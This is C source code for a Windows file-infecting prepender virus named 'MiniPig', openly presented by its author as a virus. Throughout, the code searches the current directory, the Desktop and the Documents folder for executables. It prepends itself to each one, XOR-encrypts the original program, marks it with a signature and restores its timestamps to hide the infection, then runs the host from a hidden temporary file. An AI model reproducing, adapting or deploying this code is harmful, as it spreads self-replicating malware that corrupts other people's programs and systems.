/************************************************************************************
 * This is my new prepender virus ... its name is MiniPig.                          *
 * It works in simple way, nothing of new, look at code.                            *
 * It will infect current directory, desktop and Personal folder ... This could be  *
 * buggy so if you find some bugs you can contact me at: wargame89@yahoo.it         *
 * I declared the virus size as string so you can modify it in an hex-editor ...    *
 * Pay attenction to this value !!!                                                 * 
 * P.S: I tested this only under WinXP and Win98 ... bye :)                         *
 ************************************************************************************/
#include <windows.h>
#include <stdio.h>
/* This is the signature of an infected file */
#define MINIPIG_SIGNATURE "MiniPig by [WarGame,#eof]"
/* The length of the signature string ! */
#define MINIPIGSIGNATURE_LEN 26
/* This is the key used for xor encryption */
#define XoR 0x4a
/* This will contain the original virus code */
static char *VirusBody = NULL;
/* Original virus size ( Compressed with upx using -9 option )*/
static char *Str_VirSize = "16384"; 
static DWORD VirusSize;       

       /* This it the infection routine */
void Infects(void) 
{
	WIN32_FIND_DATA w32; /* Used by FindFirstFile() and FindNexFile() */
	HANDLE SearchFD = NULL; /* Search handle */
	HANDLE EXE_FD = NULL; /* File handle */
	char *VictimBuf = NULL; /* This is the buffer used in I/O operations */
	char Signature[MINIPIGSIGNATURE_LEN]; /* Used to check signature */
	DWORD readbytes,writtenbytes; /* Used by WriteFile() and ReadFile(); */
	DWORD VictimAttributes; /* Attributes of victim */
	FILETIME WriteTime,LastAccessTime,CreationTime; /* Used to restore victim's time */
	DWORD CryptCnt; /* Used in crypting loop */

		if((SearchFD = FindFirstFile("*.EXE",&w32)) == INVALID_HANDLE_VALUE) 
        {
			return;
		}

		do
		{
			 /* Let's open the found executable! */
			if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
			{
				/* Checks it it has already been infected */
				      SetFilePointer(EXE_FD,-(MINIPIGSIGNATURE_LEN),0,FILE_END);
                      memset(Signature,0,MINIPIGSIGNATURE_LEN);
				/* Reads ( possible ) signature */
					  ReadFile(EXE_FD,Signature,MINIPIGSIGNATURE_LEN,&readbytes,NULL);
                      
				/* Already infected !!! */
					  if(strstr(Signature,MINIPIG_SIGNATURE)) 
					  {
						  CloseHandle(EXE_FD);
						  continue;
					  }
				
				/* Infects it !!! */
					  else 
					  {
						  /* Saves old attributes */
						  VictimAttributes = w32.dwFileAttributes;
						  CopyMemory(&WriteTime,&w32.ftLastWriteTime,sizeof(FILETIME));
						  CopyMemory(&CreationTime,&w32.ftCreationTime,sizeof(FILETIME));
						  CopyMemory(&LastAccessTime,&w32.ftLastAccessTime,sizeof(FILETIME));
					      
						  /* Grows up the victim's size */
                           SetFilePointer(EXE_FD,MINIPIGSIGNATURE_LEN+VirusSize,0,FILE_CURRENT);
						   SetEndOfFile(EXE_FD);
						  /* Closes the file */
						   CloseHandle(EXE_FD);

						   /* Reopens the file */
                           if((EXE_FD = CreateFile(w32.cFileName,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
						   {
                                /* Failed to allocate memory ! */
							    if((VictimBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,w32.nFileSizeLow)) == NULL) 
								{
									CloseHandle(EXE_FD);
									continue;
								}
								
								else 
								{
									/* Ok Now we read victim on buffer */
									ReadFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&readbytes,NULL);
									/* Ok overwrites with virus */
									SetFilePointer(EXE_FD,-(w32.nFileSizeLow),0,FILE_CURRENT);
									WriteFile(EXE_FD,VirusBody,VirusSize,&writtenbytes,NULL);
									 
									/* Crypts VictimBuf with simple XoR */
									for(CryptCnt = 0;CryptCnt < w32.nFileSizeLow;CryptCnt++)
									{
										VictimBuf[CryptCnt] ^= XoR;
									}
									
									/* Ok writes the victim at the end */
                                    WriteFile(EXE_FD,VictimBuf,w32.nFileSizeLow,&writtenbytes,NULL);
									/* Writes the signature */
									WriteFile(EXE_FD,MINIPIG_SIGNATURE,MINIPIGSIGNATURE_LEN,&writtenbytes,NULL);
									/* Restores victim's file and attributes */
									SetFileAttributes(w32.cFileName,VictimAttributes);
									SetFileTime(EXE_FD,&CreationTime,&LastAccessTime,&WriteTime);
									/* Closes All and frees memory */
									CloseHandle(EXE_FD);
									GlobalFree(VictimBuf);
									/* DONE ! */
								}
						   }
						  
					  }
			}
		}while(FindNextFile(SearchFD,&w32));

		/* Closes the search */
		FindClose(SearchFD);
}

/* This is used to return to host */
void ReturnToHost(char *mypath) 
{
       HANDLE TotalFD; /* This is the handle used to read the entire file */
       char *TotalBuf = NULL; /* Put the file here */
	   DWORD TotalSize; /* Total size of file */
	   HANDLE HostFD; /* Used to write host's code */
	   DWORD readbytes,writtenbytes; /* As usual ... :) */
	   DWORD DecryptCnt; /* Used for decrypting */
	   char *randChars = "AcGh9Kl6"; /* Used for random name generation */
	   char randName[10]; /* Random name for temp host */
	   STARTUPINFO inf_prog; /* Used for CreateProcess() */
       PROCESS_INFORMATION info_pr; /* the same ... :) */
	          
	   /* Reads entire file */
	    if((TotalFD = CreateFile(mypath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
		{
			/* What is the size of mine ??? */
			TotalSize = GetFileSize(TotalFD,NULL);
			
			/* Allocates memory */
			if((TotalBuf = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,TotalSize)) == NULL) 
			{
				ExitProcess(0);
			}

			/* Reads and puts in buffer */
			ReadFile(TotalFD,TotalBuf,TotalSize,&readbytes,NULL);
			/* Closes file */
			CloseHandle(TotalFD);
			
			/* Builds random name */
			srand(GetTickCount());
            sprintf(randName,"%c%c%c%c%c%c.exe",randChars[rand()%8],randChars[rand()%8],
				randChars[rand()%8],randChars[rand()%8],randChars[rand()%8],randChars[rand()%8]);
			
			/* Creates the temp host file */
			if((HostFD = CreateFile(randName,GENERIC_WRITE,FILE_SHARE_WRITE,NULL
				  ,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN,NULL)) != INVALID_HANDLE_VALUE) 
			{
				
				/* Decrypts !!! */
                for(DecryptCnt = VirusSize;DecryptCnt < TotalSize;DecryptCnt++)
				{
					TotalBuf[DecryptCnt] ^= XoR;
				}
				/* Hosts written! */
				SetFilePointer(HostFD,0,0,FILE_BEGIN);
				WriteFile(HostFD,TotalBuf+VirusSize,(TotalSize-VirusSize),&writtenbytes,NULL);
				/* Frees and closes */
				CloseHandle(HostFD);
				GlobalFree(TotalBuf);
				
				/* Returns to host ! */
				memset(&inf_prog,0,sizeof(STARTUPINFO));
                memset(&info_pr,0,sizeof(PROCESS_INFORMATION));
                inf_prog.cb = sizeof(STARTUPINFO);
                inf_prog.dwFlags = STARTF_USESHOWWINDOW;
                inf_prog.wShowWindow = SW_SHOW;

				/* Runs host ! */
				CreateProcess(NULL,randName,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL,
                             &inf_prog,&info_pr);
				
				/* Waits and deletes tmp exe */
				WaitForSingleObject(info_pr.hProcess,INFINITE);
				DeleteFile(randName);
				
				/* Exits ! */
				ExitProcess(0);
			}
		}

			else
			{
				ExitProcess(0);
			}
}

/* This is to get special folder */
int GetSpecialFolder(char *path,char *folder) 
{
	HKEY hKey; /* Reg handle */
	DWORD len = MAX_PATH;

	memset(path,0,MAX_PATH);
	
	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",0,KEY_QUERY_VALUE,&hKey) !=
                 ERROR_SUCCESS)
                    {
	                       return 0; /* failed :( */
                    }
  
	/* Puts found path in path buffer */
	if(RegQueryValueEx(hKey,folder,0,NULL,path,&len) != ERROR_SUCCESS)
                    {
		                   RegCloseKey(hKey);
                           return 0;
                    }

	/* Success ! */
	RegCloseKey(hKey);
	return 1;
}

/* The main of virus */
int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char MyPath[MAX_PATH];
	HANDLE VirFD = NULL; /* Used to read virus body */
	DWORD readbytes; /* As usual used by ReadFile() */
	DWORD CurrentSize; /* Current size of proggy */
	char CWD[MAX_PATH],OriginalCWD[MAX_PATH]; /* Used to change directory */

	/* Gets its path */
	 GetModuleFileName(NULL,MyPath,MAX_PATH);

	/* Gets its current directory */
	 GetCurrentDirectory(MAX_PATH,OriginalCWD);

	/* Gets Virus Size */
	 VirusSize = atoi((char *)Str_VirSize);
	 
	/* Puts virus body in VirusBody buffer */
	 if((VirFD = CreateFile(MyPath,GENERIC_READ,FILE_SHARE_READ,NULL
				  ,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL)) != INVALID_HANDLE_VALUE) 
	 {
          if((VirusBody = GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT,VirusSize)) == NULL) 
		  {
			  ExitProcess(0);
		  }

		  /* Reads virus body and puts it in VirusBody */
		  ReadFile(VirFD,VirusBody,VirusSize,&readbytes,NULL);
		  /* Gets the total file size */
		  CurrentSize = GetFileSize(VirFD,NULL);
		  /* Closes virus's handle */
		  CloseHandle(VirFD);
				
	 }

	  /* Error !!! Exits !!! */
	 else 
	 {
		 ExitProcess(0);
     }
	 
	 /* Infects current dir */
	 Infects();

     /* Infects desktop */
	 if(GetSpecialFolder(CWD,"Desktop"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }

	 /* Infects personal folder ( usually named Documents ) */
	 if(GetSpecialFolder(CWD,"Personal"))
	 {
	 SetCurrentDirectory(CWD);
	 Infects();
	 }
	 
	 
	 /* If we are not in the first generation we return to host ! */
     if(CurrentSize > VirusSize) 
     {
	 SetCurrentDirectory(OriginalCWD);
	 ReturnToHost(MyPath);
	 }
}